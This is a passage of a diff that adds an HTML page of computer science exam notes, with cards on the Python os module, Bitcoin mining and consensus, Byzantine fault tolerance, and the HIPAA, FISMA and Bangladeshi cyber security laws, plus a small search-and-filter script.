+      <div class="card" data-topic="python os module chdir listdir path">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Python</div>
+        <h3>Python OS Module</h3>
+        <p>The Python <strong><code>os</code> module</strong> provides a portable interface to OS-level operations. Key functions: <code>os.getcwd()</code> — returns current working directory; <code>os.chdir(path)</code> — changes current directory; <code>os.listdir(path)</code> — returns list of files/folders in directory; <code>os.mkdir()</code> / <code>os.makedirs()</code> — create directories; <code>os.remove()</code> — delete file; <code>os.rename()</code> — rename file/folder; <code>os.path.join()</code> — safely concatenate paths (cross-platform); <code>os.path.exists()</code> — check if path exists; <code>os.path.isfile()</code> / <code>os.path.isdir()</code> — type checks; <code>os.environ</code> — access environment variables. The <code>os.path</code> submodule is crucial for writing portable scripts that work on both Windows and Linux without hardcoding path separators.</p>
+        <div class="keypoints">
+          <span class="kp">getcwd()</span><span class="kp">chdir()</span><span class="kp">listdir()</span><span class="kp">os.path</span><span class="kp">environ</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== BLOCKCHAIN ====== -->
+  <div class="chapter cat-bc" data-cat="bc">
+    <div class="chapter-header">
+      <span class="chapter-num">06</span>
+      <h2 class="chapter-title"><span class="dot"></span>Blockchain</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="bitcoin decentralized economy transaction double spending">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Blockchain</div>
+        <h3>Bitcoin & Transaction Mechanism</h3>
+        <p><strong>Bitcoin</strong> is a decentralized digital currency using blockchain — a distributed, immutable ledger. Transactions work as follows: the sender broadcasts a transaction (sender address, recipient address, amount, digital signature) to the P2P network. Miners validate using the sender's <strong>public key</strong> and digital signature. Validated transactions are grouped into blocks. <strong>Double Spending</strong> is the risk of spending the same Bitcoin twice. Bitcoin prevents this through consensus — once a transaction is confirmed and embedded deep in the blockchain (6+ confirmations), altering it requires recalculating all subsequent blocks, requiring >51% of the network's computing power (51% Attack). The <strong>UTXO (Unspent Transaction Output)</strong> model tracks which coins have been spent, preventing duplication without a central authority.</p>
+        <div class="keypoints">
+          <span class="kp">P2P Network</span><span class="kp">Digital Signature</span><span class="kp">Double Spend</span><span class="kp">UTXO</span><span class="kp">51% Attack</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="mining proof of work consensus hashing">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Blockchain</div>
+        <h3>Mining, Proof of Work & Consensus</h3>
+        <p><strong>Mining</strong> is the process of adding new blocks to the blockchain. Miners compete to solve a <strong>Proof of Work (PoW)</strong> puzzle: find a nonce such that <code>SHA-256(block data + nonce)</code> produces a hash below a target value (starts with N zeros). This is computationally expensive but easy to verify. The winner broadcasts the block, earns <strong>block reward</strong> (newly minted Bitcoin) + transaction fees. <strong>Difficulty</strong> adjusts every 2016 blocks (~2 weeks) to maintain ~10 min per block. <strong>Consensus</strong> is achieved when the majority of nodes accept the longest valid chain. <strong>Hashing</strong> (SHA-256) ensures tamper-evidence — changing one block changes its hash, breaking all subsequent blocks, making fraud computationally infeasible.</p>
+        <div class="keypoints">
+          <span class="kp">Nonce</span><span class="kp">SHA-256</span><span class="kp">Block Reward</span><span class="kp">Difficulty</span><span class="kp">Longest Chain</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="mining pool">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Blockchain</div>
+        <h3>Mining Pool</h3>
+        <p>A <strong>Mining Pool</strong> is a group of miners who combine their computational power to increase their chances of successfully mining a block and share the rewards proportionally. Since solo mining has low probability of success against large mining farms, pools provide more consistent income. A <strong>Pool Coordinator</strong> distributes work units (partial PoW problems called <em>shares</em>) to each miner. When the pool mines a block, the reward is distributed based on contributed shares. Popular pools: F2Pool, AntPool, Foundry USA. Risks: <em>Centralization</em> — if one pool exceeds 51% hash rate, it could execute a 51% attack. Pool fees (1-3%) are charged. Mining pools have made individual mining economically viable despite increasing network difficulty.</p>
+        <div class="keypoints">
+          <span class="kp">Shares</span><span class="kp">Hash Rate</span><span class="kp">51% Risk</span><span class="kp">Pool Fee</span><span class="kp">Proportional Reward</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="byzantine fault tolerance bft">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Blockchain</div>
+        <h3>Byzantine Fault Tolerance (BFT)</h3>
+        <p><strong>Byzantine Fault Tolerance (BFT)</strong> is a distributed system's ability to function correctly even when some nodes fail or act maliciously, sending conflicting information — known as the <strong>Byzantine Generals Problem</strong>. In a blockchain context, BFT ensures consensus even when up to ⌊(n-1)/3⌋ nodes are malicious (where n = total nodes). <em>PBFT (Practical BFT)</em> — used in permissioned blockchains (Hyperledger) — achieves consensus through a 3-phase protocol (pre-prepare, prepare, commit). <em>Bitcoin's PoW</em> achieves probabilistic BFT through economic incentives — attacking requires enormous hash power (>51%). BFT is critical for blockchain reliability, especially in financial applications, ensuring the network reaches agreement without trusting individual nodes.</p>
+        <div class="keypoints">
+          <span class="kp">Byzantine Problem</span><span class="kp">PBFT</span><span class="kp">Hyperledger</span><span class="kp">⌊(n-1)/3⌋</span><span class="kp">Consensus</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== DIGITAL LAWS ====== -->
+  <div class="chapter cat-law" data-cat="law">
+    <div class="chapter-header">
+      <span class="chapter-num">07</span>
+      <h2 class="chapter-title"><span class="dot"></span>Digital Laws & Policies</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="hipaa health insurance portability">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Digital Laws</div>
+        <h3>HIPAA</h3>
+        <p>The <strong>Health Insurance Portability and Accountability Act (HIPAA)</strong>, enacted in 1996 in the USA, regulates the protection of patient health information (<strong>PHI — Protected Health Information</strong>). Key rules: <em>Privacy Rule</em> — governs use/disclosure of PHI; <em>Security Rule</em> — requires administrative, physical, and technical safeguards for electronic PHI (ePHI); <em>Breach Notification Rule</em> — requires notifying patients within 60 days of a breach; <em>Enforcement Rule</em> — penalties up to $1.9M per violation category per year. Entities covered: hospitals, clinics, health insurers, and their business associates. Violations can be civil or criminal. HIPAA mandates encryption, access controls, audit trails, and employee training. It is a critical law for healthcare IT and cybersecurity professionals.</p>
+        <div class="keypoints">
+          <span class="kp">PHI</span><span class="kp">Privacy Rule</span><span class="kp">Security Rule</span><span class="kp">Breach Notification</span><span class="kp">ePHI</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="fisma federal information security">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Digital Laws</div>
+        <h3>FISMA</h3>
+        <p>The <strong>Federal Information Security Management Act (FISMA)</strong>, enacted in 2002 (updated 2014 as FISMA Reform Act), requires US federal agencies to develop, document, and implement information security programs. It mandates: <em>Risk categorization</em> using FIPS 199 (Low/Moderate/High), <em>Minimum security controls</em> (NIST SP 800-53), <em>Annual security reviews</em>, <em>Continuous monitoring</em>, and <em>Incident response plans</em>. Each agency must appoint a <strong>CISO (Chief Information Security Officer)</strong>. The <strong>OMB</strong> oversees compliance; <strong>NIST</strong> provides standards. Non-compliance can result in funding cuts. FISMA created a framework for federal cybersecurity, ensuring government systems (and contractors handling federal data) maintain adequate security standards. It applies to all federal information systems including cloud services.</p>
+        <div class="keypoints">
+          <span class="kp">NIST 800-53</span><span class="kp">CISO</span><span class="kp">Risk Categorization</span><span class="kp">FIPS 199</span><span class="kp">Continuous Monitoring</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="digital security act cyber security act 2023">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Digital Laws</div>
+        <h3>Digital Security Act / Cyber Security Act (2023)</h3>
+        <p>Bangladesh's <strong>Digital Security Act (DSA) 2018</strong> — and its replacement, the <strong>Cyber Security Act 2023</strong> — govern digital crimes and online security. The 2023 Act addresses: cybercrime, hacking, identity theft, online defamation, spreading misinformation, and unauthorized data access. Key provisions: <em>Section 17</em> — critical infrastructure attacks (up to 14 years), <em>Section 19</em> — hacking (7 years), <em>Section 25</em> — spreading harmful content (3 years), <em>Section 29</em> — online defamation (3 years). The act establishes a <strong>Digital Security Agency</strong> and <strong>CIRT (Computer Incident Response Team)</strong>. Criticism: broad provisions may restrict freedom of expression. Internationally, the <strong>EU Cybersecurity Act (2019)</strong> established ENISA's permanent mandate and an EU-wide cybersecurity certification framework for ICT products and services.</p>
+        <div class="keypoints">
+          <span class="kp">DSA 2018</span><span class="kp">CSA 2023</span><span class="kp">CIRT</span><span class="kp">Hacking Penalty</span><span class="kp">ENISA</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <span>CS Exam Notes</span> · 5-Mark Questions · All topics covered · Study well 🎯
+</footer>
+
+<script>
+  const searchInput = document.getElementById('searchInput');
+  const filterBtns = document.querySelectorAll('.filter-btn');
+  let activeFilter = 'all';
+
+  function applyFilters() {
+    const q = searchInput.value.toLowerCase();
+    const chapters = document.querySelectorAll('.chapter');
+
+    chapters.forEach(ch => {
+      const cat = ch.getAttribute('data-cat');
+      const catMatch = activeFilter === 'all' || cat === activeFilter;
+
+      if (!catMatch) { ch.classList.add('hidden'); return; }
+
+      const cards = ch.querySelectorAll('.card');
+      let visibleCards = 0;
+
+      cards.forEach(card => {
+        const topic = card.getAttribute('data-topic') || '';
+        const text = card.textContent.toLowerCase();
+        const textMatch = !q || text.includes(q) || topic.includes(q);
+        card.classList.toggle('hidden', !textMatch);
+        if (textMatch) visibleCards++;
+      });
+
+      ch.classList.toggle('hidden', visibleCards === 0);
+    });
+  }
+
+  searchInput.addEventListener('input', applyFilters);
+
+  filterBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      filterBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      activeFilter = btn.getAttribute('data-cat');
+      applyFilters();
+    });
+  });
+</script>
+</body>
+</html>
